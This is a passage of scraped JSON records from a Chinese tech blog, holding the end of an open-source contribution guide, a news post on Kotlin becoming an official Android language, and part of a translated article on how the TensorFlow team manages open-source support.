坏了！请修好。”</p></blockquote>\n<p><strong>事先做好功课。</strong>不懂没什么，但要表现出你试过了。在求助之前，务必查看项目的自述文件、文档、 Issue （开放的或关闭的）、邮件列表，并且在因特网上搜索答案。当你证明你在试着学习时，人们会表示赞赏。</p>\n<blockquote><p>😇“我不确定怎么实现 X。我查过了帮助文档，没找到哪里有提到。”<br>\n😢“我怎么做 X？”</p></blockquote>\n<p><strong>请求要简短而直接。</strong>和发送电子邮件很像，每一个贡献，不管多简单或多有帮助，都需要某个其他人的审查。许多项目收到的请求比能提供帮助的人多。简明一点。你会提高某人能帮到你的可能性。</p>\n<blockquote><p>😇“我想写一份 API 教程。”<br>\n😢“前几天我正在高速公路上开车，停下来加油，然后我对我们应该做的事情有了这个惊人的想法，但在我解释这个想法之前，让我向你展示……”</p></blockquote>\n<p><strong>交流要对公众可见。</strong>尽管有点诱人，但不要私下联系维护者，除非你需要分享敏感信息（比如安全问题或严重的违反行为）。当你使对话对公众可见时，更多的人能从你的交流中学习并受益。讨论本身也可能是一种贡献。</p>\n<blockquote><p>😇（作为评论）“@-maintainer 你好！我们在这个 pull request 功能上怎么继续？”<br>\n😢（作为一封电子邮件）“你好，抱歉通过电子邮件麻烦你了，但我不知道你有没有可能审查我的 pull request ”</p></blockquote>\n<p><strong>可以提问（但要耐心！）。</strong>每个人在某个时刻都曾是项目的新人，而且即使有经验的贡献者查看新项目时也需要赶上进度。由此类推，即使长期贡献者也并非总是对项目的每个部分都熟悉。对他们表现出与你希望他们对你表现出的同样的耐心。</p>\n<blockquote><p>😇“谢谢你研究这个错误。我按你的建议做了。这是输出结果。”<br>\n😢 “为什么你不能解决我的问题？这不是你的项目吗？”</p></blockquote>\n<p><strong>尊重团体的决定。</strong>你的想法可能与项目的优先考虑或愿景不同。他们可能提供反馈或决定不执行你的想法。你应该讨论并寻求妥协，而维护者必须花比你更长的时间适应你的决定。如果你不同意他们的方向，你总是可以致力于你自己的 fork 或启动你自己的项目。</p>\n<blockquote><p>😇“我对你不能支持我的用例感到失望，但既然你已经解释了它只影响一小部分用户，我理解为什么了。谢谢倾听。”<br>\n😢“为什么你不支持我的用例？这无法接受！”</p></blockquote>\n<p><strong>最重要的是，要优雅。</strong>开源由来自世界各地的合作者组成。上下文在跨越语言、文化、地理和时区时会丢失。另外，书面交流使得传递语调或心情更困难。假设这些对话的意图都是好的。礼貌的把想法推后，要求更多的上下文，或进一步澄清你的态度，这些都是好的做法。使因特网成为比你发现它时更好的地方。</p>\n<h3>收集上下文</h3>\n<p>在做任何事之前，做一个快速的检查，确保你的想法没有在其它地方被讨论过。略读项目的自述文件、 Issue （开放的和关闭的）、邮件列表和 Stack Overflow。你不一定要花几个小时检查一切，但对几个关键词的快速搜索会大有帮助。</p>\n<p>如果你在其它地方找不到你的想法，你已经准备好开始行动了。如果项目在 GitHub 上，你多半会通过开启一个 Issue 或使用 pull request 来沟通：</p>\n<ul>\n<li><strong>Issues </strong>就像开启一个会话或讨论</li>\n<li><strong>使用 Pull requests </strong>是为了开始致力于一个解决方案</li>\n<li><strong>对于不重要的交流，</strong>比如一个澄清或操作方式问题，试着在 Stack Overflow、IRC、Slack 上提问，或是其它的聊天通道，如果项目有对应渠道的话</li>\n</ul>\n<p>在你开启一个 Issue 或 使用 pull request 以前，检查项目的贡献文档（通常是一个叫做 CONTRIBUTING 的文件，或者在自述文件里），看看你是否需要把特定的东西包含进去。例如，他们可能要求你遵照一个模版，或是要求你使用测试。</p>\n<p>如果你想做一个实质的贡献，在着手以前先开一个 Issue 提问。一个有帮助的做法是，在着手进行可能不被接受的工作以前，先对项目观察一段时间（在 GitHub 上，<a href=\"https://help.github.com/articles/watching-repositories/\">你可以点击“Watch”</a>来获取所有会话的通知），并且了解团体成员。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/02/26768d6d7f04e1cd4d44e8978deaa9da.png\"><img class=\"size-thumbnail wp-image-63259 aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/26768d6d7f04e1cd4d44e8978deaa9da-150x150.png\" alt=\"810438\" width=\"150\" height=\"150\"></a></p>\n<blockquote><p>找一个你经常使用的项目，在 GitHub 上“ Watch”它，阅读每个 Issue 和使用 pull request，你能从中学到很多。— <a href=\"https://github.com/gaearon\">@gaearon</a> <a href=\"https://twitter.com/dan_abramov/status/819555257055322112\">参与项目</a></p></blockquote>\n<h3>开一个 Issue</h3>\n<p>通常，在以下情况下你应该开一个 Issue ：</p>\n<ul>\n<li>报告一个你不能自行解决的错误</li>\n<li>讨论一个高级的主题或想法（比如团体、愿景、策略）</li>\n<li>推荐一个新特性或其它有关项目的想法</li>\n</ul>\n<p>Issue 沟通的诀窍：</p>\n<ul>\n<li><strong>如果你看到一个你想着手处理的开放 Issue ，</strong>在 Issue 中作评论来让人们知道你在处理它。那样，人们就不太可能重复你的工作。</li>\n<li><strong>如果一个 Issue 是一段时间以前开放的，</strong>可能它正在其它地方被处理，或已经被解决了，所以在开始工作前，在评论里要求做个确认。</li>\n<li><strong>如果你开了一个 Issue ，后来自己想出了答案，</strong>在 Issue 中作评论来让人们知道，然后关闭该 Issue 。即使对结果的文档化也是对项目的一种贡献。</li>\n</ul>\n<h3>使用 pull request</h3>\n<p>通常，在以下情况下你应该使用 <strong>pull request</strong>：</p>\n<ul>\n<li>提交细小的修正（例如拼写错误、断开的链接或明显的错误）</li>\n<li>对已经在 Issue 中要求的，或你已经讨论过的贡献开始工作</li>\n</ul>\n<p>使用 pull reques 并不一定代表已完成的工作。在早期开一个 pull request 往往更好，这样其他人可以观察你的进展或给予反馈。只要在主题行里把它标记为“WIP”（进行中的工作）。以后你总能添加更多的提交。</p>\n<p>如果项目是在 GitHub 上，这是怎样提交一个 pull request 的方法：</p>\n<ul>\n<li><strong><a href=\"https://guides.github.com/activities/forking/\">Fork仓库</a></strong>并把它克隆到本地。通过把原始“上游”仓库添加为远程操作把它与你的本地连接。经常拉入（pull in）“上游”的改变，这样你保持在最新状态，这样的话，当你提交你的 pull request 时就不太可能出现合并冲突。（更详细的操作指南见<a href=\"https://help.github.com/articles/syncing-a-fork/\">这里</a>。）</li>\n<li>为你的编辑<strong>创建一个分支</strong></li>\n<li>在你的 pull request 中<strong>引用相关的 Issue </strong>或支持文档（比如，“Closes #37.”）</li>\n<li>如果你的变更包括 HTML/CSS 中的差异，<strong>把之前和之后的屏幕截图包含进去</strong>。把图像拖放到你的 pull request 主体中。</li>\n<li><strong>测试你的变更！</strong>如果有现存的测试，对你的变更运行这些测试，如果需要，创建新的测试。无论测试存在与否，确保你的变更不会破坏现有的项目。\n<ul>\n<li>尽你所能<strong>以项目的风格做贡献</strong>。这可能意味着相比你自己的仓库使用不同的缩进、分号或注释，但这样使维护者的合并、其他人的理解和将来的维护变得更简单。</li>\n</ul>\n</li>\n</ul>\n<p>如果你第一次使用<a href=\"http://makeapullrequest.com/\"> Pull Request</a>，查看<a href=\"http://makeapullrequest.com/\">“</a><a href=\"http://makeapullrequest.com/\"> 做一个 Pull Request</a> <a href=\"http://makeapullrequest.com/\">”</a>，这是 <a href=\"https://github.com/kentcdodds\"><strong>@kentcdodds </strong></a>创建的，可作为一个免费的演练资源。</p>\n<p> </p>\n<h2 style=\"text-align: center;\">第六部分：提交贡献之后会发生什么</h2>\n<p><span style=\"color: #808080;\">你做到了！祝贺你成为一名开源贡献者。我们希望这是许多次中的第一次。</span></p>\n<p>在你提交贡献之后，会发生以下情形之一：</p>\n<h3>😭  你没有得到回应。</h3>\n<p>但愿你在做贡献以前<a href=\"https://opensource.guide/how-to-contribute/#a-checklist-before-you-contribute\">检查过项目的活跃迹象</a>。然而，即使对一个活跃的项目来说，也有可能你的贡献得不到回应。</p>\n<p>如果超过一星期了你还没有得到回应，有理由在同一个线程（thread）中礼貌地回复，请某人做审查。如果你知道审查你的贡献的合适的人的名字，你可以在线程中@-提到他们。</p>\n<p><strong>不要</strong>私下接触那个人；记住，公开的交流对开源项目来说至关重要。</p>\n<p>如果你做了一个礼貌的“碰撞”，还是没人回应，那可能永远也不会有人回应。这种滋味不好受，但不要因此气馁。每个人都经历过这种事！你没有得到回应可能有很多原因，包括可能不受你控制的个人境况。试着找到另一个项目或方式做贡献。如果有什么理由来解释为什么在其它团体成员投入这个项目此并作出回应前不要在贡献项目上投入太多时间的话，这就是很好的一个。</p>\n<h3>🚧 某人要求对你的贡献做改动。</h3>\n<p>你常常会被要求对你的贡献做改动，无论是对你的想法范围的反馈，还是对你代码的改动。</p>\n<p>当某人要求做改动时，要作出响应。他们花了时间审查你的贡献。开了一个 pull request 然后就走掉是不好的表现。如果你不知道怎样做改动，研究该问题，然后如果需要的话寻求帮助。</p>\n<p>如果你不再有时间在该 Issue 上工作（例如，如果会话已经进行了几个月，你的境况发生了变化），让维护者知晓，这样他们就不再期待一个回应。其他人可能乐于接手。</p>\n<h3>👎 你的贡献没被接受。</h3>\n<p>最后，你的贡献可能会，也可能不会被接受。但愿你没有在那里面做太多的工作。如果你不确定它为什么没被接受，要求维护者的反馈和说明是完全合理的。然而最终，这是他们的决定，你需要表示尊重。不要争论或怀有敌意。如果你意见不同，始终欢迎你 fork 并在你自己的版本上工作。</p>\n<h3>🎉 你的贡献被接受了。</h3>\n<p>好极了！你成功地做了开源贡献！</p>\n<p> </p>\n<h2 style=\"text-align: center;\">第七部分：你做到了！</h2>\n<p>不管你刚刚完成了你的第一个开源贡献，或者你正在寻找新的贡献方式，我们希望你收到鼓舞并采取行动。即使你的贡献没有被接受，当维护者付出努力帮助你时，不要忘了说声谢谢。开源正是由像你一样的人造就的：选一个 Issue 、开 pull request 、评论，或逐一举手击掌。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111204\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111204votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111204\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 12 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/qdoverture\">效楚</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/qdoverture\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/qdoverture\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/qdoverture/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/qdoverture/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 12</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/b94146f42c8e0ca2b0f04ed89b59053c.jpg"], "fav_nums": 12, "comment_nums": 0, "create_date": "2017/05/19", "praise_nums": 3}
{"tags": "Kotlin,开发,安卓开发", "front_image_path": "full/70a26ac7d36e9a80368f97ef3948b78809073482.jpg", "title": "大事件：Kotlin 成了 Android 开发的官方语言", "url_object_id": "b64db56ac3ac38d9f64dea7bd872d7f9", "url": "http://blog.jobbole.com/111024/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/aoi\">伯小乐</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>今天是 Google I/O 2017 大会第一日。一觉醒来，发现 Kotlin 成为了 Android 的官方开发语言。谷歌安卓团队今天宣布对 Kotlin 提供 first-class 的支持。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/63918611gy1ffprvu5jnvj20sg0edqj7.jpg\" width=\"553\" height=\"279\"></p>\n<p>马后炮一下，谷歌在和甲骨文 Java 版权官司之后，必然要做的调整之一就是改语言。</p>\n<h3>关于 Kotlin，先了解这些</h3>\n<ul class=\"list-paddingleft-2\">\n<li>Kotlin 是一个基于 JVM 的新编程语言，用 JetBrains 的话来说是「更现代化、更强大」的语言。</li>\n</ul>\n<ul class=\"list-paddingleft-2\">\n<li>Kotlin 由 JetBrains 在 2010 年开发，2011 年开源了： https://github.com/JetBrains/kotlin  。2016 年发布 1.0 版，2017 年 4 月发布 1.1.2 版。</li>\n</ul>\n<ul class=\"list-paddingleft-2\">\n<li>谷歌安卓团队和 JetBrains 的关系不一般。Android Studio 就是基于 JetBrains 开发的 IntelliJ IDEA 社区版；</li>\n</ul>\n<ul class=\"list-paddingleft-2\">\n<li>谷歌和 JetBrains 将为 Kotlin 成立一个非盈利基金会。Kotlin 语言的开发，还是 JB 为主导。</li>\n</ul>\n<ul class=\"list-paddingleft-2\">\n<li>Kotlin 语言的开发团队，目前大约 40 人。会继续往常那样运作。Andrey Breslav 还是 Kotlin 语言的首席设计师。</li>\n</ul>\n<ul class=\"list-paddingleft-2\">\n<li>JetBrains 对 Kotlin 的愿景是：用同一种语言，桥接多平台的不同应用的端对端开发。包括全栈 Web 应用、Android 和 iOS 客户端、嵌入式/物联网等等。</li>\n</ul>\n<ul class=\"list-paddingleft-2\">\n<li>Kotlin 与 Java 100% 互通，并具备诸多 Java 尚不支持的新特性。</li>\n</ul>\n<ul class=\"list-paddingleft-2\">\n<li>Android Studio 3.0 预览版已支持 Kotlin。下载 AS 3.0 预览版后，打开现有的 Java 文件，在「Code」菜单中选择「Convert Java File to Kotlin File」。AS 会添加 Kotlin 依赖，然后把 Java 代码转成同等功能的 Kotlin 代码。</li>\n</ul>\n<ul class=\"list-paddingleft-2\">\n<li>Kotlin 易于上手，可以逐步引入到现有项目中。这意味着安卓开发者目前现有的技能和技术积累/投资并没有浪费。</li>\n</ul>\n<p><img id=\"pic\" class=\"M_cur_zoom_in\" src=\"http://wx2.sinaimg.cn/large/63918611gy1ffprvzlsf7j215o0k00sy.jpg\" width=\"555\" height=\"266\"></p>\n<h3>国内开发者讨论</h3>\n<p>@平常中的光辉：</p>\n<blockquote><p>安卓也有了自己的开发语言，就像苹果的object-c，一个来自java，一个来自c，两种流派的竞争，java面向对象，c面向过程,java诞生在电子消费产品和互联网应用，c诞生在单片机</p></blockquote>\n<p>@练习恶魔</p>\n<blockquote><p>听说Kotlin可以开发安卓了，赶紧看了一眼语言特性。发现这货就是个JVM上的C# 啊。。然后放心的去干别的了</p></blockquote>\n<p>@安徽农民</p>\n<blockquote><p>看了Kotlin的语法，怎么赶紧与Swift简直是兄弟俩啊，风格太接近了，特别是用？表示可能为null的情形。这俩谁先谁后啊？</p></blockquote>\n<p>@sunnyxibei</p>\n<blockquote><p>今年的IO并没有太多的闪光点，最棒的就是对kotlin的官方“认证”了 ，成为官方“钦定”的开发语言，一场IO大会下来，jetBrains或是最大赢家</p></blockquote>\n<p>@BroncoTc:</p>\n<blockquote><p>jvm语言那么多，为啥就是kotkin？</p></blockquote>\n<p>@据悉社:</p>\n<blockquote><p>因为Kotlin学习的curve最小，它就是Java本来应该的样子，你几乎可以把它当C井直接用（逃。而现在的Java是Java一系列错误设计决定之后失败的样子。。。</p></blockquote>\n<p>@二蒙：</p>\n<blockquote><p>以前以为Google会放弃安卓，没想到是安卓放弃了Java 。真的很鄙视Oracle，默默为SUN 点根蜡烛</p></blockquote>\n<p>@老赵：</p>\n<blockquote><p>JB不愧是世上第一的IDE开发商（两个第一，五个前三，十个前五）</p></blockquote>\n<h3>Kotlin 学习资源</h3>\n<ul class=\"list-paddingleft-2\">\n<li>Try Kotlin：http://try.kotlinlang.org/</li>\n<li>Getting Started Guide：https://kotlinlang.org/docs/tutorials/getting-started.html</li>\n</ul>\n<p><strong>参考</strong></p>\n<p>JetBrains、微博、Verturebeta、cnBeta</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111024\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111024votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111024\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">伯小乐</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/2015/11/f2bb4f6f428a49476a2e91c355c8d150.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            伯乐在线小编一枚~~~~PS：我不是@小编辑，不要问我了        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/aoi\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/aoi/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/aoi/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 245</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx3.sinaimg.cn/large/63918611gy1ffprvu5jnvj20sg0edqj7.jpg"], "fav_nums": 3, "comment_nums": 0, "create_date": "2017/05/18", "praise_nums": 1}
{"tags": "开源,TensorFlow,IT技术", "front_image_path": "full/5c3e802fa7c46fa53f8411355279d527314c20be.jpg", "title": "TensorFlow 团队如何管理开源项目", "url_object_id": "ff65dbf752ac6cec76ddb579b61b1e66", "url": "http://blog.jobbole.com/111200/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.oreilly.com/ideas/how-the-tensorflow-team-handles-open-source-support\">Oreilly</a>   译文出处：<a target=\"_blank\" href=\"https://my.oschina.net/editorial-story/blog/902230\">开源中国</a>   </div><div>\n<blockquote><p>TensorFlow 技术主管在这篇文章中和我们分享了他们团队管理开源项目的经验。</p></blockquote>\n<p>开源不仅仅是把代码贡献出来，然后希望有人来使用它。我也知道这一点，不过在成为 Google TensorFlow 团队的成员后，我才认识到围绕一个软件构建一个社区所需要考虑的因素实在是很多。</p>\n<h3>社区服务</h3>\n<p>当一个新项目发布出来时，该项目唯一的专家就是编写这个项目的人。他们是唯一可以撰写文档和回答问题的人，而且他们可以最有效地改进软件。因此，我们这些 TensorFlow 团队中的核心成员也成为了项目扩大的瓶颈：毕竟我们无法马上完成任何事情。我们知道如何编写代码和文档，因为这些任务是我们日常工作的一部分。但另一方面，回答大量来自社区开发者的问题不是我们应该做的事，尽管我们也知道这对于项目的成功至关重要。</p>\n<p>为了保证用户可以获得所需要的答案，核心工程师团队的所有人都加入了轮流回答问题。团队成员可以选择解决 <a href=\"http://stackoverflow.com/questions/tagged/tensorflow\" target=\"_blank\" rel=\"nofollow\">Stack Overflow 上带有 #tensorflow 标记的问题</a>、在 GitHub 上审查 <a href=\"https://github.com/tensorflow/tensorflow/pulls\" target=\"_blank\" rel=\"nofollow\">pull requests</a>，分类 <a href=\"https://github.com/tensorflow/tensorflow/issues\" rel=\"nofollow\">GitHub issues</a>，处理同步外部和内部代码或追查<a href=\"https://ci.tensorflow.org/\" target=\"_blank\" rel=\"nofollow\">测试失败</a>的原因。</p>\n<p>通常，每个工程师每次对一个特定领域负责一个星期，以循环的方式轮流负责。因此，轮值的工程师在本周正常工作中的生产力会低很多，不过至少每个人工作被打断的频率降到了几个月一次。</p>\n<h3>Pull requests</h3>\n<p>我们开源 TensorFlow 部分的目的是希望通过社区的贡献来改进它。到目前为止，我们已经拥有超过 400 个外部贡献者添加了代码，从小的文档修复到大型的添加，如<a href=\"https://github.com/tensorflow/tensorflow/pull/664\" target=\"_blank\" rel=\"nofollow\">支持 OS X GPU</a>、<a href=\"https://github.com/tensorflow/tensorflow/pull/9117\" target=\"_blank\" rel=\"nofollow\">OpenCL 的实现</a>或 <a href=\"https://github.com/tensorflow/tensorflow/pull/8943\" rel=\"nofollow\">InfiniBand RDMA</a>。首先，轮值的核心工程师必须对每项贡献都进行审查，以确定是否有价值。如果贡献通过初始审查，会触发一组 <a href=\"https://ci.tensorflow.org/\" target=\"_blank\" rel=\"nofollow\">Jenkins 测试</a>，以确保其不会导致任何故障。如果这些行为也通过审查后，值班的工程师可能会希望其他对这个领域更了解的工程师来看一看，所以这将会被转交给该专家进行审查。</p>\n<p>GitHub 全新的详细的<a href=\"https://github.com/features/code-review/\" target=\"_blank\" rel=\"nofollow\">代码审查工具</a>在这个过程中提供了很大的帮助；没有它们之前，处理所有的个人意见是一件痛苦的事情。通常，大的 PRs 会在工作中保持一段时间，核心工程师会和一个或多个外部贡献者协同工作，在大家都满意后，PR 将会在 GitHub 中被合并，然后在下次运行同步时合并到我们的内部代码库中。</p>\n<h3>代码许可协议</h3>\n<p>作为我们自动的 pull request 的一部分，我们会将贡献者的 GitHub 账号与我们在 <a href=\"https://cla.developers.google.com/\" rel=\"nofollow\">cla.developers.google.com</a> 上的记录相匹配，以确保任何的外部贡献者都拥有代码许可协议（CLA）。我们的目标是确保整个代码库可在 Apache 2.0 协议下准确无误地分发。当 pull request 的轮值工程师要对出现的所有问题进行整理时，如果一个 pull request 内部关联了不同的邮箱，或是贡献者需要以公司的身份登录，情况可能会变得复杂。</p>\n<h3>GitHub issues</h3>\n<p>目前已经有超过 5000 个 issues 提交到 TensorFlow，对于有些人来说，这看起来似乎有点让人沮丧。但这是我最喜欢的指标 —— 它说明了用户有在真正使用这个项目！为了确保能对每个提交的 issue 都进行回应，值班的工程师会时刻关注新出现的信息，并尝试使用标签对它们进行分类。如果是一个我们内部不太可能在短期时间内实现的特性，我们会将其标记为“Contributions Welcome（欢迎贡献）”，对于 bug，我们会尝试优先考虑。这段时间以来，随着外部用户自己也成了某些领域的专家，我们看到越来越多的问题无需我们的帮助也能够被解决了。特别是在像 Windows 这些我们不是每天都使用的平台上。</p>\n<p>如果某个 issue 通过社区没能找到答案或者解决方案，而且它的优先级也比较高，值班工程师会将其分配给对这个领域更了解的工程师。整个 TensorFlow 团队都有 GitHub 账号，所以我们可以使用常规的 GitHUb issue 跟踪器来分配问题。我们考虑过把用户提交的 bug 复制到我们的内部系统，但为相同的信息同步两份副本的代价实在是太高了。因此，我们的工程师除了要关注内部的跟踪器之外，还需要打开 GitHub 上有人提交了 bug 的邮件通知，以便及时看到属于自己的分配。</p>\n<h3>Stack Overflow</h3>\n<p><a href=\"https://twitter.com/mrry\" target=\"_blank\" rel=\"nofollow\">Derek Murray</a> 是 Stack Overflow 值班小组的负责人。我十分敬畏他回答问题的能力，根据他的<a href=\"http://stackoverflow.com/users/3574081/mrry\" target=\"_blank\" rel=\"nofollow\">个人资料页</a>，他发表过的帖子已经被超过 130 万人浏览。他还设法建了一个由 RSS 源驱动的自动化电子表格。开始的时候，我们每周轮流负责，但后来需要处理的问题的数量变得十分庞大，一个人难以处理。所以后来在轮流的基础上，我们采用了自动分配问题的方式来代替之前的做法。</p>\n<p>目前我在这个小组里，因此每天早上浏览完自己的的邮件后，我会通过查看电子表格来看一下自己被分配到了什么问题。很遗憾，我们做不到自己回答所有的问题，但我们会审查每一个进来的问题。如果问题相对比较简单，我们会自己回答。</p>\n<p>值班的工程师是一个“前线”的角色，但有时候回答问题需要更多的时间或专业知识。如果问题看上能被解答，但社区里却没人回答，我们就会研究一下代码（通常使用‘git blame’）来看一下团队里有谁可能会对这个问题有一些想法。然后值班工程师会发送一封电子邮件，询问我们找到的内部专家是否可以提供帮助。</p>\n<h3>邮件列表</h3>\n<p>我们设置了一个邮件列表，起初我们不太清楚该用它做什么。但很显然，用它来跟踪问题或回答一般的问题是十分糟糕的方式。</p>\n<p>后来，我们把它当做讨论区来使用。但在实际使用中我们发现，即使对于架构问题，GitHub issue 也比它更适合。</p>\n<p>因此现在我们使用邮件列表来发送信息和分享通知，这还是值得订阅的。</p>\n<h3>代码同步</h3>\n<p>很多和我聊过天的人都会对这样一件事感到惊讶：我们在谷歌内部使用的代码库和我们在 GitHub 上提供的几乎完全相同。然而它们之间还是有一些区别的：例如，对谷歌专用的基础设施的支持是分开的，路径也不一样。但同步过程是完全机械化的。我们至少每周推送一次内部变更，并且也会经常从 GitHub 上拉取。</p>\n<p>棘手的问题是我们要进行双向同步。在 GitHub 公共项目和我们的内部版本中，有很多更改是同时发生的，我们需要反复把它们全部进行合并。由于没有现成的基础设施可供使用，我们创建了一系列的 Python 脚本来处理这些问题。脚本可将 GitHub 上的改动拉取到我们内部的资源存储库，并转换所有的头部路径（header paths）和其他小的更改，将它们与最新的内部代码合并并创建一个内部副本。然后我们就可以进行另一方向的同步，我们会将所有内部代码装换成外部格式，并使用相同的脚本将结果合并到最新的 GitHub 上。</p>\n<p>对于内部的更改，我们也会尽力确保每次check-in 都会以单个的 git commit 呈现，并把作者的 GitHub 账户和对这些更改的注释也包括在内。我们在 GitHub 上有一个特别的“tensorflow-gardener”账号用于管理这个流程，<a href=\"https://github.com/tensorflow/tensorflow/commit/708f708a458f0a4754094a5a65fb029131b2255d\" target=\"_blank\" rel=\"nofollow\">点此查看</a>一个内部的 commit 迁移到 GitHub 会变成怎样。</p>\n<p>确保在代码更改的情况下，转换流程依然有效是十分具有挑战性的。为了验证有效性，每个内部改动通过脚本转换成外部版本后仍可运行，而且与初始的内部版本没有任何差别。在任何涉及到 TensorFlow 代码库的每个内部更改上，都需要运行这个测试，不能通过测试的修改将被拒绝。对于那些发送 pull request 的人，我们有时候会要求他们进行奇怪的更改。通常，这样做的原因是我们必须确保他们的代码能与这个同步基础设施正常运行。</p>\n<h3>测试</h3>\n<p>因为我们需要支持很多平台，所以我们希望拥有一个适用范围广的测试基础设施。TensorFlow 在 Linux, Windows, OS X 桌面, 和 iOS, Android, Android Things, 以及 Raspberry Pi 上运行。同时我们还有为 GPU 提供不同的代码路径，包括 CUDA 和 OpenCL 支持，以及 Bazel, cmake, 和 plain makefile 构建过程。</p>\n<p>让每个开发者在更改后把上面这些东西手动测试一遍是不可能的，因此我们有一套能在大多数受支持的平台上运行的<a href=\"https://ci.tensorflow.org/\" target=\"_blank\" rel=\"nofollow\">自动化测试系统</a>，所有这些都由 Jenkins 自动化系统控制着。保持这样的工作需要大量的时间和精力，因为总是会存在操作系统更新、硬件问题以及其他一些与 TensorFlow 无关的问题导致测试失败。我们有一个工程师团队，专门负责保证整个测试系统正常运行，这个团队曾多次帮助我们，让我们幸免于难，所以这个投资是值得的。</p>\n<h3>开发者关系</h3>\n<p>在谷歌，我们在开源领域工作不孤单。我们从像 Kubernetes 和 开源计划办公室”（Open Source Program 